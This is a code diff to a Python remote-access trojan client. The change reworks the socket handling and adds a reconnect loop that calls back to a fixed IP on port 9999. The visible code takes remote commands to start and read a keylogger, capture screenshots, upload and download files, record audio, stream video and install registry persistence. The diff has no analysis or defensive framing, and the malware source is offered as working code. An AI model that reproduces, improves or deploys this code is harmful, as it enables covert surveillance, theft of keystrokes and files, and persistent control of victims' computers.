@@ -21,7 +21,6 @@ from mss import mss
 import numpy as np
 from filetarget import download_file, upload_file
 
-sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ip = '192.168.18.198'
 main_log1 = threading.Event()
 
@@ -29,19 +28,19 @@ def start_log():
     Keylogger().start_log()
     main_log1.set()
 
-def baca_log():
+def baca_log(sok):
     if not main_log1.is_set():
         return
 
-    open()
+    open(sok)
 
 def stop_log():
     Keylogger().stop_listener()
 
-def open():
+def open(sok):
     sok.sendall(Keylogger().baca_log().encode())
 
-def change_directory(cmd):
+def change_directory(cmd, sok):
     try:
         os.chdir(cmd)
         cur_dir = os.getcwd()
@@ -50,7 +49,7 @@ def change_directory(cmd):
         sok.sendall("Can't change directory".encode())
         pass
 
-def screen_shot():
+def screen_shot(sok):
     ss = pyautogui.screenshot()
     ss.save('ss.png')
     upload_file(sok,'ss.png')
@@ -143,7 +142,7 @@ def record_n_send():
         stream.close()
         audio.terminate()
 
-def  execute_persistence(nama_registry, file_exe):
+def execute_persistence(nama_registry, file_exe):
     file_path = os.environ['appdata']+'\\'+file_exe
     try:
         if not os.path.exists(file_path):
@@ -203,7 +202,7 @@ def byte_stream():
     vid.release()
     cv2.destroyAllWindows()
 
-def terima_perintah():
+def terima_perintah(sok):
     data = ''
     while True:
         try:
@@ -214,15 +213,17 @@ def terima_perintah():
         except socket.timeout:
             continue
 
-def jalankan_perintah():
+def jalankan_perintah(sok):
     while True:
-        perintah = terima_perintah()
+        perintah = terima_perintah(sok)
         if perintah in ('exit', 'quit'):
             break
         if perintah == 'clear':
             pass
+        elif perintah == 'background':
+            continue
         elif perintah[:3] == 'cd ':
-            change_directory(perintah[3:])
+            change_directory(perintah[3:], sok)
         elif perintah[:8] == 'download':
             upload_file(sok, perintah[9:])
         elif perintah[:6] == 'upload':
@@ -230,7 +231,7 @@ def jalankan_perintah():
         elif perintah == 'start_log':
             start_log()
         elif perintah == 'baca_log':
-            baca_log()
+            baca_log(sok)
         elif perintah == 'stop_log':
             stop_log()
             stop_log()
@@ -273,13 +274,23 @@ def jalankan_perintah():
 
 def execute_persist():
     while True:
+        sok = None
         try:
+            sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sok.settimeout(5.0)
+            res = sok.connect_ex((ip, 9999))
+            if res == 0:
+                sok.settimeout(None)
+                sok.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                jalankan_perintah(sok)
+        except Exception:
+            pass
+        finally:
+            if sok:
+                try:
+                    sok.close()
+                except:
+                    pass
             time.sleep(3)
-            sok.connect((ip, 9999))
-            jalankan_perintah()
-            sok.close()
-            break
-        except:
-            execute_persist()
 
 execute_persist()
